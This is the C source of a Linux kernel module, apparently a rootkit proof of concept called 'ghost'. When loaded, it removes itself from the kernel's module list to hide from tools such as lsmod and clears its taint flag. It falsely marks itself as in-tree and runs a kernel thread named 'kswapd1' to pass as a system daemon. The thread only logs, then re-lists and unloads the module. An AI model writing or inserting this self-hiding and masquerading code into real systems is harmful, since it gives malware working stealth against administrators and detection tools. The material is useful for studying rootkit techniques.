#include <linux/delay.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/sched/signal.h>

static struct task_struct *thread_st;
static struct module *hidden = NULL;
static struct list_head *temp = NULL;

static void __exit exit_runner(void);

static int thread_runner(void *unused)
{
	allow_signal(SIGKILL);
	int j = 0;
	do {
		pr_info("Thread runner doing thangs #%d.\n",j++);
		msleep_interruptible(5000);
		if (signal_pending(thread_st))
			break;
	} while (!kthread_should_stop());

	pr_info("Attempting to add back into module list.\n");
	list_add(&(hidden->list),temp);

	char *argv[] = {"/sbin/rmmod", "ghost", NULL};
	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);

	do_exit(0);
	return 0;
}

static int __init init_runner(void)
{
	pr_info("Starting thread runner.\n");
	thread_st = kthread_run(thread_runner, NULL, "kswapd1");
	if (thread_st)
	{
		pr_info("Removing self from module list.\n");

		struct module *m = THIS_MODULE;
		hidden = m;

		// clean out the taints field just in case
		m->taints = 0;
		
		// maintain a ptr to the head and self
		temp = &m->list;
		temp = temp->prev;

		// remove self from list
		list_del(&m->list);
		pr_info("gone..\n");
	}
	
	return 0;
}

static void __exit exit_runner(void)
{
	pr_info("Cleaning up and exiting runner.\n");
	if (thread_st)
	{
		kthread_stop(thread_st);
		pr_info("Thread runner stopped.\n");
	}
}

MODULE_LICENSE("GPL v2");
MODULE_INFO(intree,"Y");
module_init(init_runner);
module_exit(exit_runner);
